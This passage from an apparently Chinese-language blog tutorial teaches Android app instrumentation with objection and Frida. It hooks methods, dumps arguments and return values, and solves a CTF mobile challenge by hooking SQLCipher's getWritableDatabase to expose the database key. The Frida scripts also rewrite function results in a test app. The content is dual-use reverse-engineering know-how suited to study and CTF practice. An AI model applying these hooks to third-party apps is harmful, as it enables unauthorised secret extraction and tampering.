class="" title="hook方法"><p>这时候我们在“声音”或者“蓝牙”上进行操作，会命中这些hook，此时objection就会将方法打印出来，会将类似这样的信息“吐”出来：</p><img src="/posts/ab7319a3/1.5.7.png" class="" title="hook信息"><p>在这些方法中，我们对哪些方法感兴趣，就可以查看哪些方法的参数、返回值和调用栈，比如想看<code>getName()</code>方法，则运行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method android.bluetooth.BluetoothDevice.getName --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.8.png" class="" title="hook信息"><p>注意最后加上的三个选项—dump-args —dump-return —dump-backtrace，为我们成功打印出来了我们想要看的信息，其实返回值Return Value就是getName()方法的返回值，我的蓝牙耳机的型号名字M200 Pro。</p><p>再来看个有参数的，比如<code>equals()</code>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method android.bluetooth.BluetoothDevice.equals --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.9.png" class="" title="hook信息"><p>objection的help中指出，在hook给出的单个方法的时候，会hook它的所有重载。那我们可以用File类的构造器来试一下效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method java.io.File.$init --dump-args</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.6.1.png" class="" title="hook信息"><p>可以看到objection为我们hook了File构造器的所有重载，一共是6个。在设置界面随意进出几个子设置界面，可以看到命中很多次该方法的不同重载，每次参数的值也都不同。</p><p>有些类和方法在App启动时就加载完毕了，这时如何hook这些类和方法呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g &lt;packagename&gt; explore --startup-command &#x27;android hooking watch ......&#x27;</span><br></pre></td></tr></table></figure><p>或者用上面的方法，它既然被调用过了，那它肯定在内存堆中，搜索并且主动执行该类或方法。</p><p>另外，objection无法hook so函数。</p><h2 id="1-7-插件"><a href="#1-7-插件" class="headerlink" title="1.7 插件"></a>1.7 插件</h2><p>有很多小工具支持作为objection插件来使用，比如Wallbreaker、frida-dexdump等。</p><h3 id="1-7-1-Wallbreaker"><a href="#1-7-1-Wallbreaker" class="headerlink" title="1.7.1 Wallbreaker"></a>1.7.1 Wallbreaker</h3><p>加载Wallbreaker插件，load后面跟插件所在路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin load ~/.objection/plugins/Wallbreaker</span><br></pre></td></tr></table></figure><p> Wallbreaker搜索类，根据给的 pattern 对所有类名进行匹配，列出匹配到的所有类名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker classsearch &lt;pattern&gt;</span><br></pre></td></tr></table></figure><p>搜索对象，根据类名搜索内存中已经被创建的实例，列出 handle 和 toString() 的结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker objectsearch &lt;classname&gt;</span><br></pre></td></tr></table></figure><p>ClassDump，输出类的结构， 若加了 —fullname 参数，打印的数据中类名会带着完整的包名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker classdump &lt;classname&gt; [--fullname]</span><br></pre></td></tr></table></figure><p>ObjectDump，在 ClassDump 的基础上，输出指定对象中的每个字段的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker objectdump &lt;handle&gt; [--fullname]</span><br></pre></td></tr></table></figure><h2 id="1-8-例子"><a href="#1-8-例子" class="headerlink" title="1.8 例子"></a>1.8 例子</h2><p>可用上次做过的例子<a href="https://v5le0n9.github.io/posts/9f62af2.html#3-app3">攻防世界Mobile app3</a>，这次用另一种方法，利用frida hook解题。</p><p>可知下图是解题的关键，如何把<code>getWritableDatabase()</code>方法的返回值hook出来呢？</p><img src="/posts/ab7319a3/1.8.1.png" class="" title="反编译源码"><p>由于调用它的<code>a()</code>方法在App启动时就加载了，并且后面的操作再也没有使用过它，所以我们要在App启动前hook<code>getWritableDatabase()</code>。</p><p>首先运行frida-server，注入objection：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.example.yaphetshan.tencentwelcome explore </span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.8.2.png" class="" title="连接模拟器"><p>一个App中有很多个类，因为不仅有自定义的，还有系统自带的，所以我们可以搜索App包名下有哪些类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes com.example.yaphetshan.tencentwelcome</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.8.8.png" class="" title="搜索包名下的类"><p>接着可以将某个类中的所有方法列举出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking list class_methods com.example.yaphetshan.tencentwelcome.a</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.8.9.png" class="" title="列举类中的方法"><p>回归正题。要hook一个方法，首先要知道它所在的包名、类名与方法名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search methods getWritableDatabase</span><br></pre></td></tr></table></figure><p>呃…我用上面这个进行搜索没找到，是因为我用了Android 4.4。Android 5.1又可以了。</p><img src="/posts/ab7319a3/1.8.6.png" class="" title="查找方法所在"><p>也可以看从jadx中查看<code>getWritableDatabase()</code>的定义，就可以知道它从哪里来的，但静态反编译不一定准确。</p><img src="/posts/ab7319a3/1.8.3.png" class="" title="方法"><p>hook这个方法可以用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase --dump-args --dump-backtrace --dump-return </span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.8.4.png" class="" title="hook方法"><p>虽然我们成功hook了，但是无论我们怎么运行都不会命中它，因为它只有在启动时才会被加载。所以我们需要在App启动前就hook。将模拟器中的程序完全退出，执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.example.yaphetshan.tencentwelcome explore --startup-command &#x27;android hooking watch class_method net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase --dump-args --dump-backtrace --dump-return&#x27;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.8.5.png" class="" title="hook部分成功"><p>有个警告说某些hook失败，马上换Android 5。hook成功了，但是在App启动过程中没有命中该方法。</p><img src="/posts/ab7319a3/1.8.7.png" class="" title="hook成功但没命中"><p>用另一种方法，先hook好<code>getWritableDatabase()</code>方法，再利用内存堆搜索MainActivity类的句柄，进而主动执行该类的<code>a()</code>方法。因为MainActivity类中的<code>a()</code>方法调用了<code>getWritableDatabase()</code>方法，所以按理说是可以命中的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase --dump-args --dump-backtrace --dump-return</span><br><span class="line">android heap search instances com.example.yaphetshan.tencentwelcome.MainActivity</span><br><span class="line">android heap execute 0x20043e a</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.8.10.png" class="" title="命中"><h1 id="2-frida基本操作"><a href="#2-frida基本操作" class="headerlink" title="2. frida基本操作"></a>2. frida基本操作</h1><p>在AS中创建一个Empty Activity，直接运行安装在手机上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.v5le0n9.test01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.1.png" class="" title="简单的APK程序"><p>现在我们可以在代码中添加一点东西，让它每隔1s在LogCat中输出加法运算的结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> fun(<span class="number">50</span>,<span class="number">100</span>);</span><br><span class="line">            Log.d(<span class="string">&quot;l30n9ry0n2&quot;</span>, String.valueOf(m));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">fun</span> <span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;l30n9ry0n1&quot;</span>, String.valueOf(x+y));</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.2.png" class="" title="简单加法"><p>接下来可以编写js代码将App在LogCat中的结果打印出来：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(args1, args2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>启动frida-server，执行js代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U com.v5le0n9.test01 -l test01.js </span><br></pre></td></tr></table></figure><ul><li>-U：连接到USB设备</li><li>-l：载入脚本</li></ul><img src="/posts/ab7319a3/2.1.3.png" class="" title="hook"><h2 id="2-1-修改参数"><a href="#2-1-修改参数" class="headerlink" title="2.1 修改参数"></a>2.1 修改参数</h2><p>修改传入的参数，返回值的结果也随之改变：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(<span class="number">20</span>, <span class="number">90</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.5.png" class="" title="修改传入的参数"><img src="/posts/ab7319a3/2.1.6.png" class="" title="修改传入的参数"><h2 id="2-2-修改返回值"><a href="#2-2-修改返回值" class="headerlink" title="2.2 修改返回值"></a>2.2 修改返回值</h2><p>直接修改返回值结果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(args1, args2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">80</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.4.png" class="" title="修改返回值"><h2 id="2-3-查找调用栈"><a href="#2-3-查找调用栈" class="headerlink" title="2.3 查找调用栈"></a>2.3 查找调用栈</h2><p>调用栈，可以查看函数是从哪里来的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(args1, args2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.9.png" class="" title="调用栈"><p>比如这个<code>fun()</code>函数就是从<code>MainActivity.java</code>的<code>onCreate()</code>函数中来的。</p><h2 id="2-4-函数重载"><a href="#2-4-函数重载" class="headerlink" title="2.4 函数重载"></a>2.4 函数重载</h2><p>如果代码中有函数重载，而我们刚好需要hook这个函数，此时利用上面的js代码就会出错：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">total</span> <span class="operator">=</span> <span class="string">&quot;!!!---!!!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> fun(<span class="number">50</span>,<span class="number">100</span>);</span><br><span class="line">            Log.d(<span class="string">&quot;l30n9ry0n2&quot;</span>, String.valueOf(m));</span><br><span class="line">            Log.d(<span class="string">&quot;l30n9ry0n tolowercase&quot;</span>, fun(<span class="string">&quot;LOWERCASEME!&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    String <span class="title function_">fun</span><span class="params">(String x)</span>&#123;</span><br><span class="line">        total += x;</span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    String <span class="title function_">secret</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">fun</span> <span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;l30n9ry0n1&quot;</span>, String.valueOf(x+y));</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.7.png" class="" title="函数重载"><img src="/posts/ab7319a3/2.1.8.png" class="" title="函数重载"><p>它也提示了说加上<code>.overload(&lt;signature&gt;)</code>成员。如果想两个函数都打印出来，再添加一个Java.use即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(args1, args2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(args1)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, result&quot;</span>, args1, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.10.png" class="" title="函数重载"><p>同样也可以修改参数和返回值：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(args1, args2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;LIKEYOU&quot;</span>))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, result&quot;</span>, args1, result)</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;METOO&quot;</span>)</span><br><span class="line">            <span class="comment">//return &quot;METOO&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.11.png" class="" title="函数重载"><img src="/posts/ab7319a3/2.1.12.png" class="" title="函数重载"><h2 id="2-5-动静态处理和主动调用"><a href="#2-5-动静态处理和主动调用" class="headerlink" title="2.5 动静态处理和主动调用"></a>2.5 动静态处理和主动调用</h2><p>如果想打印没有被调用的函数，比如<code>secret()</code>方法，也可以打印该方法的实例和返回值。如果是动态调用，需要找到实例进行主动调用：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>,&#123;</span><br><span class="line">            <span 